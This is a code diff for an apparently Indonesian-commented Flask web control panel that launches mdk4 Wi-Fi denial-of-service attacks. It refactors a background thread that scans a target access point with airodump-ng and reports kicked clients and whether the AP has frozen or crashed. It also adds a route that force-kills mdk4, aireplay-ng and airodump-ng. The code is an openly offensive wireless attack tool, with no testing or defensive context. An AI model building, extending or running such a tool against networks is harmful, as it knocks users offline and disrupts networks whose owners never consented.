@@ -167,93 +167,6 @@ def parse_csv(filename):
     
     return networks, clients
 
-# ====================== MONITORING THREAD ======================
-
-def monitor_loop():
-    """Loop monitoring target AP untuk cek client dan status"""
-    global monitor_running, monitor_data
-    
-    print("[*] Monitoring thread started")
-    monitor_running = True
-    
-    while monitor_running:
-        try:
-            # Cek apakah ada target yang dimonitor
-            if not current_targets:
-                time.sleep(2)
-                continue
-            
-            # Ambil target pertama (untuk monitoring)
-            target = current_targets[0]
-            bssid = target['bssid']
-            
-            # Scan dengan airodump-ng
-            temp_file = "/tmp/monitor_output"
-            cmd = f"sudo timeout 3 airodump-ng {monitor_iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
-            subprocess.run(cmd, shell=True, capture_output=True)
-            
-            # Parse hasil
-            csv_file = f"{temp_file}-01.csv"
-            if os.path.exists(csv_file):
-                networks, clients = parse_csv(csv_file)
-                
-                # Update monitor data
-                monitor_data["clients"] = clients
-                monitor_data["ap_status"] = "online" if networks else "offline/freeze"
-                monitor_data["last_update"] = time.time()
-                
-                # Log jika ada perubahan
-                if len(clients) == 0 and monitor_data.get("previous_clients", 0) > 0:
-                    add_log_monitor(f"🔥 ALL CLIENTS DISCONNECTED! AP mungkin DOWN!", "error")
-                elif len(clients) < monitor_data.get("previous_clients", 0):
-                    add_log_monitor(f"⚠️ {monitor_data.get('previous_clients', 0) - len(clients)} client(s) kicked!", "warning")
-                elif len(clients) > monitor_data.get("previous_clients", 0):
-                    add_log_monitor(f"📡 {len(clients) - monitor_data.get('previous_clients', 0)} client(s) connected", "info")
-                
-                monitor_data["previous_clients"] = len(clients)
-                
-                # Hapus file temporary
-                try:
-                    os.remove(csv_file)
-                except:
-                    pass
-            
-            # Cek apakah AP masih ada di scan (freeze check)
-            if not networks:
-                monitor_data["ap_status"] = "⚠️ AP OFFLINE / FREEZE!"
-                add_log_monitor("🚨 AP TIDAK TERDETEKSI! (FREEZE/CRASH)", "error")
-            else:
-                monitor_data["ap_status"] = "✅ AP Online"
-            
-        except Exception as e:
-            print(f"[-] Monitor error: {e}")
-        
-        time.sleep(3)  # Update setiap 3 detik
-
-def add_log_monitor(message, type="info"):
-    """Tambahkan log ke console Flask"""
-    print(f"[Monitor] {message}")
-
-def start_monitor_thread():
-    """Start monitoring thread"""
-    global monitor_thread, monitor_running
-    if monitor_thread and monitor_thread.is_alive():
-        return
-    monitor_running = True
-    monitor_thread = threading.Thread(target=monitor_loop)
-    monitor_thread.daemon = True
-    monitor_thread.start()
-
-def stop_monitor_thread():
-    """Stop monitoring thread"""
-    global monitor_running, monitor_thread
-    monitor_running = False
-    if monitor_thread:
-        monitor_thread.join(timeout=2)
-        monitor_thread = None
-
-# ====================== PARSE CSV ======================
-
 def parse_csv_scan(filename):
     """Parse airodump-ng CSV output file untuk scan"""
     networks = []
@@ -289,6 +202,76 @@ def parse_csv_scan(filename):
                         "power": power
                     })
     return networks
+
+# ====================== MONITORING THREAD ======================
+
+def monitor_loop():
+    """Loop monitoring target AP untuk cek client dan status"""
+    global monitor_running, monitor_data, monitor_iface
+    
+    print("[*] Monitoring thread started")
+    monitor_running = True
+    
+    while monitor_running:
+        try:
+            if not current_targets or not monitor_iface:
+                time.sleep(2)
+                continue
+            
+            target = current_targets[0]
+            bssid = target['bssid']
+            
+            temp_file = "/tmp/monitor_output"
+            cmd = f"sudo timeout 3 airodump-ng {monitor_iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
+            subprocess.run(cmd, shell=True, capture_output=True)
+            
+            csv_file = f"{temp_file}-01.csv"
+            networks = []
+            clients = []
+            
+            if os.path.exists(csv_file):
+                networks, clients = parse_csv(csv_file)
+                
+                monitor_data["clients"] = clients
+                monitor_data["ap_status"] = "✅ AP Online" if networks else "⚠️ AP OFFLINE / FREEZE!"
+                monitor_data["last_update"] = time.time()
+                
+                if len(clients) == 0 and monitor_data.get("previous_clients", 0) > 0:
+                    print("[Monitor] 🔥 ALL CLIENTS DISCONNECTED! AP mungkin DOWN!")
+                elif len(clients) < monitor_data.get("previous_clients", 0):
+                    print(f"[Monitor] ⚠️ {monitor_data.get('previous_clients', 0) - len(clients)} client(s) kicked!")
+                
+                monitor_data["previous_clients"] = len(clients)
+                
+                try:
+                    os.remove(csv_file)
+                except:
+                    pass
+            
+            if not networks:
+                monitor_data["ap_status"] = "⚠️ AP OFFLINE / FREEZE!"
+                print("[Monitor] 🚨 AP TIDAK TERDETEKSI! (FREEZE/CRASH)")
+            
+        except Exception as e:
+            print(f"[-] Monitor error: {e}")
+        
+        time.sleep(3)
+
+def start_monitor_thread():
+    global monitor_thread, monitor_running
+    if monitor_thread and monitor_thread.is_alive():
+        return
+    monitor_running = True
+    monitor_thread = threading.Thread(target=monitor_loop)
+    monitor_thread.daemon = True
+    monitor_thread.start()
+
+def stop_monitor_thread():
+    global monitor_running, monitor_thread
+    monitor_running = False
+    if monitor_thread:
+        monitor_thread.join(timeout=2)
+        monitor_thread = None
 
 # ====================== ROUTE SCAN ======================
 
@@ -353,7 +336,6 @@ def get_interfaces():
 
 @app.route('/monitor_data', methods=['GET'])
 def get_monitor_data():
-    """Get real-time monitoring data"""
     global monitor_data
     return jsonify({
         "status": "success",
@@ -372,10 +354,8 @@ def start_mdk4():
     if not interface:
         return jsonify({"status": "error", "message": "No interface selected"})
     
-    # Stop attack yang sedang berjalan
     stop_attack()
     
-    # Siapkan command berdasarkan tipe
     cmd = None
     warning_msg = None
     
@@ -422,7 +402,6 @@ def start_mdk4():
             if len(targets) > 1:
                 warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
                 print(f"[!] {warning_msg}")
-                print(f"[!] {len(targets)-1} other target(s) ignored")
             
             cmd = [
                 "sudo", "mdk4", interface, "a",
@@ -441,7 +420,6 @@ def start_mdk4():
         attack_process = subprocess.Popen(cmd, preexec_fn=os.setsid)
         attack_running = True
         
-        # Start monitoring thread
         if current_targets:
             start_monitor_thread()
         
@@ -463,8 +441,48 @@ def start_mdk4():
 
 @app.route('/stop_mdk4', methods=['POST'])
 def stop_mdk4():
-    stop_attack()
-    return jsonify({"status": "success", "message": "Attack stopped"})
+    try:
+        stop_attack()
+        return jsonify({"status": "success", "message": "Attack stopped"})
+    except Exception as e:
+        print(f"[-] Error stopping attack: {e}")
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/force_stop', methods=['POST'])
+def force_stop():
+    """Force stop semua proses"""
+    global attack_process, attack_running, monitor_running
+    
+    try:
+        print("[*] Force stopping all processes...")
+        
+        # Kill semua proses
+        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
+        subprocess.run("sudo pkill -9 -f aireplay-ng", shell=True, check=False)
+        subprocess.run("sudo pkill -9 -f airodump-ng", shell=True, check=False)
+        
+        if attack_process:
+            try:
+                attack_process.kill()
+            except:
+                pass
+            attack_process = None
+        
+        attack_running = False
+        monitor_running = False
+        
+        # Reset monitor data
+        global monitor_data
+        monitor_data = {
+            "clients": [],
+            "ap_status": "unknown",
+            "packets_sent": 0,
+            "last_update": None
+        }
+        
+        return jsonify({"status": "success", "message": "Force stopped"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
 
 def stop_attack():
     global attack_process, attack_running
@@ -478,7 +496,6 @@ def stop_attack():
         attack_process = None
     subprocess.run("sudo pkill -f mdk4", shell=True, check=False)
     
-    # Stop monitoring
     stop_monitor_thread()
     global monitor_data
     monitor_data = {
